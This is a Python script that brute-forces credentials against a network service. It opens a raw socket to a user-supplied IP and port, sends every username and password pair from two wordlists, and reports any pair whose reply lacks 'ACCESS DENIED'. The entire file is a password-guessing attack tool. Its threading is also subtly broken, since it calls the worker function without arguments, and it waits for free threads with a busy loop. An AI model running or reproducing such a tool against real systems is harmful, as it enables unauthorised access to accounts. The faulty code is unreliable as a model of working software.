import logging
import sys
import socket
import threading

logging.getLogger("bruteforce.runtime").setLevel(logging.ERROR)

if len(sys.argv) != 6:
    print("The format is: main.py <target_ip> <target_port> <threads> <username_file> <password_file>")
    sys.exit(0)

target_ip = str(sys.argv[1])
target_ip_port = int(sys.argv[2])
threads = int(sys.argv[3])
username_file = sys.argv[4]
password_file = sys.argv[5]


def tryCredentials(username, password):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((target_ip, target_ip_port))
        s.recv(1024)
        s.sendall(username.strip() + b' ' + password.strip() + b'\n')
        data = s.recv(1024)
        if data.find(b'ACCESS DENIED') == -1:
            print('Password found!', password.decode())
            sys.exit()


with open(username_file, 'rb') as f:
    usernames = f.readlines()

with open(password_file, 'rb') as f:
    passwords = f.readlines()

for username in usernames:
    for password in passwords:
        while threading.active_count() >= threads:
            pass
        threading.Thread(target=tryCredentials(), args=(username, password)).start()
